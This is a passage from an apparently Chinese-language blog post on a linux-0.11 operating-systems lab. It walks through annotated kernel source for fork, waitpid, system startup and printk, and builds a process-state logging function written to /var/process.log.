class="number">1</span>)+FIRST_TSS_ENTRY,&amp;(p-&gt;tss));</span><br><span class="line">	set_ldt_desc(gdt+(nr&lt;&lt;<span class="number">1</span>)+FIRST_LDT_ENTRY,&amp;(p-&gt;ldt));</span><br><span class="line">	p-&gt;state = TASK_RUNNING;	<span class="comment">/* do this last, just in case */</span></span><br><span class="line">	<span class="keyword">return</span> last_pid;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<ul>
<li>在 linux-0.11 中，进程是由 <code>task[NR_TASKS]</code> 数组进行管理的（其中第一个进程为 <code>init</code> 进程）</li>
<li>新建进程的过程本质上就是往 <code>task[NR_TASKS]</code> 中添加一个 <code>task_struct</code> 结构体</li>
</ul>
<p>实验要求父进程必须在所有子进程结束后才能返回，此时需要 wait 系统调用，其作用是等待子进程结束并返回子进程的退出状态码，对应源码如下：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">pid_t</span> <span class="title">wait</span><span class="params">(<span class="keyword">int</span> * wait_stat)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="keyword">return</span> waitpid(<span class="number">-1</span>,wait_stat,<span class="number">0</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">define</span> FIRST_TASK task[0]</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> LAST_TASK task[NR_TASKS-1]</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">sys_waitpid</span><span class="params">(<span class="keyword">pid_t</span> pid,<span class="keyword">unsigned</span> <span class="keyword">long</span> * stat_addr, <span class="keyword">int</span> options)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="keyword">int</span> flag, code;</span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">task_struct</span> ** <span class="title">p</span>;</span></span><br><span class="line"></span><br><span class="line">	verify_area(stat_addr,<span class="number">4</span>); <span class="comment">/* 验证一块内存区域的安全性 */</span></span><br><span class="line">repeat:</span><br><span class="line">	flag=<span class="number">0</span>;</span><br><span class="line">	<span class="keyword">for</span>(p = &amp;LAST_TASK ; p &gt; &amp;FIRST_TASK ; --p) &#123; <span class="comment">/* 遍历task[NR_TASKS]中的所有进程 */</span></span><br><span class="line">		<span class="keyword">if</span> (!*p || *p == current) <span class="comment">/* 跳过当前进程 */</span></span><br><span class="line">			<span class="keyword">continue</span>;</span><br><span class="line">		<span class="keyword">if</span> ((*p)-&gt;father != current-&gt;pid) <span class="comment">/* 跳过当前进程的非子进程 */</span></span><br><span class="line">			<span class="keyword">continue</span>;</span><br><span class="line">		<span class="keyword">if</span> (pid&gt;<span class="number">0</span>) &#123; </span><br><span class="line">			<span class="keyword">if</span> ((*p)-&gt;pid != pid)</span><br><span class="line">				<span class="keyword">continue</span>;</span><br><span class="line">		&#125; <span class="keyword">else</span> <span class="keyword">if</span> (!pid) &#123;</span><br><span class="line">			<span class="keyword">if</span> ((*p)-&gt;pgrp != current-&gt;pgrp)</span><br><span class="line">				<span class="keyword">continue</span>;</span><br><span class="line">		&#125; <span class="keyword">else</span> <span class="keyword">if</span> (pid != <span class="number">-1</span>) &#123;</span><br><span class="line">			<span class="keyword">if</span> ((*p)-&gt;pgrp != -pid)</span><br><span class="line">				<span class="keyword">continue</span>;</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">switch</span> ((*p)-&gt;state) &#123; <span class="comment">/* waitpid设置&quot;pid=-1&quot;,程序会执行到这里(此时已经确定p为子进程) */</span></span><br><span class="line">			<span class="keyword">case</span> TASK_STOPPED: <span class="comment">/* 暂停或停止执行 */</span></span><br><span class="line">				<span class="keyword">if</span> (!(options &amp; WUNTRACED)) <span class="comment">/* WUNTRACED用于表示进程正在被跟踪 */</span></span><br><span class="line">					<span class="keyword">continue</span>;</span><br><span class="line">				put_fs_long(<span class="number">0x7f</span>,stat_addr);</span><br><span class="line">				<span class="keyword">return</span> (*p)-&gt;pid;</span><br><span class="line">			<span class="keyword">case</span> TASK_ZOMBIE: <span class="comment">/* 已经结束,但尚未释放系统资源(僵尸进程) */</span></span><br><span class="line">				current-&gt;cutime += (*p)-&gt;utime;</span><br><span class="line">				current-&gt;cstime += (*p)-&gt;stime;</span><br><span class="line">				flag = (*p)-&gt;pid;</span><br><span class="line">				code = (*p)-&gt;exit_code; </span><br><span class="line">				release(*p); <span class="comment">/* 释放子进程资源 */</span></span><br><span class="line">				put_fs_long(code,stat_addr);</span><br><span class="line">				<span class="keyword">return</span> flag;</span><br><span class="line">			<span class="keyword">default</span>: <span class="comment">/* 意味着有子进程正在运行,sys_waitpid仍然不能返回 */</span></span><br><span class="line">				flag=<span class="number">1</span>;</span><br><span class="line">				<span class="keyword">continue</span>;</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">if</span> (flag) &#123; </span><br><span class="line">		<span class="keyword">if</span> (options &amp; WNOHANG)</span><br><span class="line">			<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">		current-&gt;state=TASK_INTERRUPTIBLE; <span class="comment">/* 表示进程可以被中断 */</span></span><br><span class="line">		schedule(); <span class="comment">/* 进行调度 */</span></span><br><span class="line">		<span class="keyword">if</span> (!(current-&gt;signal &amp;= ~(<span class="number">1</span>&lt;&lt;(SIGCHLD<span class="number">-1</span>))))</span><br><span class="line">			<span class="keyword">goto</span> repeat;</span><br><span class="line">		<span class="keyword">else</span></span><br><span class="line">			<span class="keyword">return</span> -EINTR;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">return</span> -ECHILD;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<ul>
<li>注意：只要 <code>wait(&amp;stat)</code> 检测到一个子进程处于 TASK_STOPPED 或者 TASK_ZOMBIE 状态时就会返回</li>
<li>当 <code>wait(&amp;stat)</code> 遍历完所有进程都找不到当前进程的子进程时，就会返回 <code>-ECHILD</code></li>
</ul>
<p>根据实验要求，我们编写的实验代码如下：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;time.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/times.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/wait.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">char</span> * argv[])</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="keyword">int</span> pid[<span class="number">8</span>];</span><br><span class="line">	<span class="keyword">int</span> i;</span><br><span class="line">	<span class="keyword">int</span> stat;</span><br><span class="line">	<span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; <span class="number">8</span>; i++) &#123;</span><br><span class="line">		pid[i] = fork();</span><br><span class="line">		<span class="keyword">if</span>(!pid[i])&#123; <span class="comment">/* 子进程调用cpuio_bound */</span></span><br><span class="line">			cpuio_bound(<span class="number">20</span>,<span class="number">18</span>,<span class="number">2</span>);</span><br><span class="line">			<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">else</span> <span class="keyword">if</span>(pid[i] &lt; <span class="number">0</span> )</span><br><span class="line">		&#123;</span><br><span class="line">			<span class="built_in">printf</span>(<span class="string">&quot;Failed to fork child process %d!\n&quot;</span>,i+<span class="number">1</span>);</span><br><span class="line">			<span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; <span class="number">8</span>; i++)</span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">&quot;Child PID: %d\n&quot;</span>, pid[i]);</span><br><span class="line"></span><br><span class="line">	<span class="keyword">while</span> ((wait(&amp;stat)) &gt; <span class="number">0</span>); <span class="comment">/* 等待所有子进程返回 */</span></span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>由于实验要求记录从操作系统启动到系统关机过程中所有进程的运行轨迹，因此我们需要先了解一下系统启动的过程：</p>
<ul>
<li>BIOS 在完成硬件检测和资源分配后，将硬盘中的引导程序 bootloader 读到系统内存中然后将控制权交给 bootloader</li>
<li>bootloader（引导加载器）负责从硬盘或软盘加载 Linux 内核和根文件系统（root filesystem），当计算机开机时，bootloader 会读取硬盘或软盘上的配置信息（grub、lilo …），然后将内核和根文件系统加载到内存中</li>
<li>内核启动后，会首先读取根文件系统，将其挂载到根目录下，然后调用 swapper 进程（最开始处于内核态，然后通过 <code>move_to_user_mode</code> 切换到用户态），该进程会执行一些初始化任务，如设置内存分配、网络初始化等</li>
<li>init 进程是 Linux 系统的第一个用户空间程序，它负责启动其他进程和服务，在 init 进程启动后，它会加载其他所需的进程和服务，如：网络服务（sshd、httpd …）、系统服务（crond、syslog …）等</li>
<li>init 进程加载的其他进程和服务也会像 init 进程一样，通过系统调用与内核交互，它们可以访问内核提供的功能，它们也可以创建、删除和监控其他进程</li>
<li>在 init 进程加载其他进程和服务后，用户空间程序就可以正常运行了，用户可以通过终端或其他界面与系统交互，如：输入输出、文件操作、网络访问 …</li>
</ul>
<p>下面是 swapper 进程（pid=0）执行的代码： </p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">main</span><span class="params">(<span class="keyword">void</span>)</span>		<span class="comment">/* This really IS void, no error here. */</span></span></span><br><span class="line"><span class="function"></span>&#123;			<span class="comment">/* The startup routine assumes (well, ...) this */</span></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * Interrupts are still disabled. Do necessary setups, then</span></span><br><span class="line"><span class="comment"> * enable them</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"> 	ROOT_DEV = ORIG_ROOT_DEV;</span><br><span class="line"> 	drive_info = DRIVE_INFO;</span><br><span class="line">	memory_end = (<span class="number">1</span>&lt;&lt;<span class="number">20</span>) + (EXT_MEM_K&lt;&lt;<span class="number">10</span>);</span><br><span class="line">	memory_end &amp;= <span class="number">0xfffff000</span>;</span><br><span class="line">	<span class="keyword">if</span> (memory_end &gt; <span class="number">16</span>*<span class="number">1024</span>*<span class="number">1024</span>)</span><br><span class="line">		memory_end = <span class="number">16</span>*<span class="number">1024</span>*<span class="number">1024</span>;</span><br><span class="line">	<span class="keyword">if</span> (memory_end &gt; <span class="number">12</span>*<span class="number">1024</span>*<span class="number">1024</span>) </span><br><span class="line">		buffer_memory_end = <span class="number">4</span>*<span class="number">1024</span>*<span class="number">1024</span>;</span><br><span class="line">	<span class="keyword">else</span> <span class="keyword">if</span> (memory_end &gt; <span class="number">6</span>*<span class="number">1024</span>*<span class="number">1024</span>)</span><br><span class="line">		buffer_memory_end = <span class="number">2</span>*<span class="number">1024</span>*<span class="number">1024</span>;</span><br><span class="line">	<span class="keyword">else</span></span><br><span class="line">		buffer_memory_end = <span class="number">1</span>*<span class="number">1024</span>*<span class="number">1024</span>;</span><br><span class="line">	main_memory_start = buffer_memory_end;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifdef</span> RAMDISK</span></span><br><span class="line">	main_memory_start += rd_init(main_memory_start, RAMDISK*<span class="number">1024</span>);</span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line">	mem_init(main_memory_start,memory_end); <span class="comment">/* 内存分配和初始化相关的处理 */</span></span><br><span class="line">	trap_init(); <span class="comment">/* 初始化trap栈,即用于保存trap上下文的栈(trap即是异常处理) */</span></span><br><span class="line">	blk_dev_init(); <span class="comment">/* 初始化块设备结构与驱动 */</span></span><br><span class="line">	chr_dev_init(); <span class="comment">/* 初始化字符设备结构与驱动 */</span></span><br><span class="line">	tty_init(); <span class="comment">/* 初始化tty终端设备 */</span></span><br><span class="line">	time_init(); <span class="comment">/* 初始化时间模块结构 */</span></span><br><span class="line">	sched_init(); <span class="comment">/* 初始化调度模块结构 */</span></span><br><span class="line">	buffer_init(buffer_memory_end); <span class="comment">/* 初始化缓冲区模块结构 */</span></span><br><span class="line">	hd_init(); <span class="comment">/* 初始化硬盘模块结构 */</span></span><br><span class="line">	floppy_init(); <span class="comment">/* 初始化软盘模块结构以及其他配置 */</span></span><br><span class="line">	sti(); <span class="comment">/* 在系统调用表(System Call Table)中初始化内核模块 */</span></span><br><span class="line">	move_to_user_mode(); <span class="comment">/* 将内核空间的数据和指针复制到用户空间 */</span></span><br><span class="line">	<span class="keyword">if</span> (!fork()) &#123;		<span class="comment">/* 利用fork创建init进程(pid=1) */</span></span><br><span class="line">		init(); <span class="comment">/* 核心初始化操作 */</span></span><br><span class="line">	&#125;</span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> *   NOTE!!   For any other task &#x27;pause()&#x27; would mean we have to get a</span></span><br><span class="line"><span class="comment"> * signal to awaken, but task0 is the sole exception (see &#x27;schedule()&#x27;)</span></span><br><span class="line"><span class="comment"> * as task 0 gets activated at every idle moment (when no other tasks</span></span><br><span class="line"><span class="comment"> * can run). For task0 &#x27;pause()&#x27; just means we go check if some other</span></span><br><span class="line"><span class="comment"> * task can run, and if not we return here.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line">	<span class="keyword">for</span>(;;) pause();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<ul>
<li>前半部分都是一系列的初始化操作</li>
<li>系统调用 fork 创建的 init 进程会执行核心函数 init，源码如下：</li>
</ul>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">static</span> <span class="keyword">char</span> *argv_rc[] = &#123;<span class="string">&quot;/bin/sh&quot;</span>, <span class="literal">NULL</span>&#125;;</span><br><span class="line"><span class="keyword">static</span> <span class="keyword">char</span> *envp_rc[] = &#123;<span class="string">&quot;HOME=/&quot;</span>, <span class="literal">NULL</span>&#125;;</span><br><span class="line"></span><br><span class="line"><span class="keyword">static</span> <span class="keyword">char</span> *argv[] = &#123;<span class="string">&quot;-/bin/sh&quot;</span>, <span class="literal">NULL</span>&#125;;</span><br><span class="line"><span class="keyword">static</span> <span class="keyword">char</span> *envp[] = &#123;<span class="string">&quot;HOME=/usr/root&quot;</span>, <span class="literal">NULL</span>&#125;;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">init</span><span class="params">(<span class="keyword">void</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="keyword">int</span> pid,i;</span><br><span class="line"></span><br><span class="line">	setup((<span class="keyword">void</span> *) &amp;drive_info); <span class="comment">/* 完成文件系统的加载 */</span></span><br><span class="line">    <span class="comment">/* /dev/tty0表示系统中的第一个控制台设备</span></span><br><span class="line"><span class="comment">    在启动Linux系统时,系统会默认使用/dev/tty0作为控制台设备</span></span><br><span class="line"><span class="comment">    dup用来复制标准输入的文件描述符 */</span></span><br><span class="line">	(<span class="keyword">void</span>) open(<span class="string">&quot;/dev/tty0&quot;</span>,O_RDWR,<span class="number">0</span>); <span class="comment">// 打开stdin </span></span><br><span class="line">	(<span class="keyword">void</span>) dup(<span class="number">0</span>);					 <span class="comment">// 打开stout </span></span><br><span class="line">	(<span class="keyword">void</span>) dup(<span class="number">0</span>);					 <span class="comment">// 打开sterr</span></span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;%d buffers = %d bytes buffer space\n\r&quot;</span>,NR_BUFFERS,</span><br><span class="line">		NR_BUFFERS*BLOCK_SIZE);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;Free mem: %d bytes\n\r&quot;</span>,memory_end-main_memory_start);</span><br><span class="line">	<span class="keyword">if</span> (!(pid=fork())) &#123;</span><br><span class="line">		close(<span class="number">0</span>);</span><br><span class="line">		<span class="keyword">if</span> (open(<span class="string">&quot;/etc/rc&quot;</span>,O_RDONLY,<span class="number">0</span>)) <span class="comment">/* 该文件包含了系统启动时需要执行的一系列命令(这些命令用于设置系统环境,启动各种服务,配置网络等) */</span></span><br><span class="line">			_exit(<span class="number">1</span>);</span><br><span class="line">		execve(<span class="string">&quot;/bin/sh&quot;</span>,argv_rc,envp_rc); </span><br><span class="line">		_exit(<span class="number">2</span>);</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">if</span> (pid&gt;<span class="number">0</span>)</span><br><span class="line">		<span class="keyword">while</span> (pid != wait(&amp;i)) <span class="comment">/* 子进程结束以后,父进程继续执行 */</span></span><br><span class="line">			<span class="comment">/* nothing */</span>;</span><br><span class="line">	<span class="keyword">while</span> (<span class="number">1</span>) &#123;</span><br><span class="line">		<span class="keyword">if</span> ((pid=fork())&lt;<span class="number">0</span>) &#123;</span><br><span class="line">			<span class="built_in">printf</span>(<span class="string">&quot;Fork failed in init\r\n&quot;</span>);</span><br><span class="line">			<span class="keyword">continue</span>;</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">if</span> (!pid) &#123;</span><br><span class="line">			close(<span class="number">0</span>);close(<span class="number">1</span>);close(<span class="number">2</span>);</span><br><span class="line">			setsid(); <span class="comment">/* 创建一个新的会话,并将其作为当前进程的会话首进程 */</span></span><br><span class="line">			(<span class="keyword">void</span>) open(<span class="string">&quot;/dev/tty0&quot;</span>,O_RDWR,<span class="number">0</span>); </span><br><span class="line">			(<span class="keyword">void</span>) dup(<span class="number">0</span>); </span><br><span class="line">			(<span class="keyword">void</span>) dup(<span class="number">0</span>);</span><br><span class="line">			_exit(execve(<span class="string">&quot;/bin/sh&quot;</span>,argv,envp));</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">while</span> (<span class="number">1</span>)</span><br><span class="line">			<span class="keyword">if</span> (pid == wait(&amp;i))</span><br><span class="line">				<span class="keyword">break</span>;</span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">&quot;\n\rchild %d died with code %04x\n\r&quot;</span>,pid,i);</span><br><span class="line">		sync(); <span class="comment">/* 强制文件系统将数据写入磁盘(不会立即将数据写入磁盘,而是会等待磁盘的缓冲区被填满后才会将数据写入磁盘) */</span></span><br><span class="line">	&#125;</span><br><span class="line">	_exit(<span class="number">0</span>);	<span class="comment">/* NOTE! _exit, not exit() */</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>在创建日志文件 <code>/var/process.log</code> 前，需要以下操作先执行：</p>
<ul>
<li>等待 <code>setup((void *) &amp;drive_info)</code> 完成文件系统的加载（否则会导致系统错误）</li>
<li>等待 <code>stdin/stdout/stderr</code> 生成完毕（否则会导致文件描述符混乱）</li>
</ul>
<p>为了监控 init 进程，我们需要将 init 进程中如下的代码迁移到 swapper 进程中，但这样会触发一个 <code>task[0] trying to sleep</code> 的报错，网上搜索后发现是配置的问题</p>
<p>所以我这里选择不监控 swapper 进程（包括它的非 init 子进程），将 <code>open(&quot;/var/process.log&quot;)</code> 写到 init 进程中：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">setup((<span class="keyword">void</span> *) &amp;drive_info);</span><br><span class="line">(<span class="keyword">void</span>) open(<span class="string">&quot;/dev/tty0&quot;</span>,O_RDWR,<span class="number">0</span>);</span><br><span class="line">(<span class="keyword">void</span>) dup(<span class="number">0</span>);</span><br><span class="line">(<span class="keyword">void</span>) dup(<span class="number">0</span>);</span><br><span class="line">(<span class="keyword">void</span>)open(<span class="string">&quot;/var/process.log&quot;</span>, O_CREAT | O_TRUNC | O_WRONLY, <span class="number">0666</span>);</span><br></pre></td></tr></table></figure>
<ul>
<li>由于用户态的其他进程都是 init 进程的子进程，因此 <code>/var/process.log</code> 会作为 “文件描述符-3” 被传递给后续的用户态进程</li>
<li>注意：swapper 不止有 init 一个子进程，而其他子进程没有 “文件描述符-3”，也就不会被监控</li>
</ul>
<p>接下来我们需要使用 “文件描述符-3” 来往 <code>/var/process.log</code> 中写入数据，不过在此之前我们需要先搞清楚 printk 函数的底层逻辑：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">static</span> <span class="keyword">char</span> buf[<span class="number">1024</span>];</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">printk</span><span class="params">(<span class="keyword">const</span> <span class="keyword">char</span> *fmt, ...)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	va_list args;</span><br><span class="line">	<span class="keyword">int</span> i;</span><br><span class="line"></span><br><span class="line">	va_start(args, fmt); <span class="comment">/* 初始化可变参数列表 */</span></span><br><span class="line">	i = <span class="built_in">vsprintf</span>(buf, fmt, args); <span class="comment">/* 用于将格式化字符串中的参数替换为实际值 */</span></span><br><span class="line">	va_end(args); <span class="comment">/* 清理可变参数列表 */</span></span><br><span class="line">	__asm__(<span class="string">&quot;push %%fs\n\t&quot;</span></span><br><span class="line">			<span class="string">&quot;push %%ds\n\t&quot;</span></span><br><span class="line">			<span class="string">&quot;pop %%fs\n\t&quot;</span></span><br><span class="line">			<span class="string">&quot;pushl %0\n\t&quot;</span></span><br><span class="line">			<span class="string">&quot;pushl $buf\n\t&quot;</span></span><br><span class="line">			<span class="string">&quot;pushl $0\n\t&quot;</span></span><br><span class="line">			<span class="string">&quot;call tty_write\n\t&quot;</span> <span class="comment">/* 将数据写入终端设备(打印) */</span></span><br><span class="line">			<span class="string">&quot;addl $8,%%esp\n\t&quot;</span></span><br><span class="line">			<span class="string">&quot;popl %0\n\t&quot;</span></span><br><span class="line">			<span class="string">&quot;pop %%fs&quot;</span> ::<span class="string">&quot;r&quot;</span>(i)</span><br><span class="line">			: <span class="string">&quot;ax&quot;</span>, <span class="string">&quot;cx&quot;</span>, <span class="string">&quot;dx&quot;</span>);</span><br><span class="line">	<span class="keyword">return</span> i;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>我们可以参考 printk 函数的代码，仿照写一个格式化的写入函数：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;linux/sched.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/stat.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">static</span> <span class="keyword">char</span> logbuf[<span class="number">1024</span>];</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">writelogf</span><span class="params">(<span class="keyword">const</span> <span class="keyword">char</span> *fmt, ...)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	va_list args;</span><br><span class="line">	<span class="keyword">int</span> i;</span><br><span class="line"></span><br><span class="line">	va_start(args, fmt);</span><br><span class="line">	i = <span class="built_in">vsprintf</span>(logbuf, fmt, args); </span><br><span class="line">	va_end(args);</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> (!(file = task[<span class="number">1</span>]-&gt;filp[<span class="number">3</span>])) <span class="comment">/* 获取init进程的&quot;文件描述符-3&quot;(日志文件) */</span></span><br><span class="line">		<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">	inode = file-&gt;f_inode;</span><br><span class="line">	__asm__(<span class="string">&quot;push %%fs\n\t&quot;</span></span><br><span class="line">			<span class="string">&quot;push %%ds\n\t&quot;</span></span><br><span class="line">			<span class="string">&quot;pop %%fs\n\t&quot;</span></span><br><span class="line">			<span class="string">&quot;pushl %0\n\t&quot;</span></span><br><span class="line">			<span class="string">&quot;pushl $logbuf\n\t&quot;</span></span><br><span class="line">			<span class="string">&quot;pushl 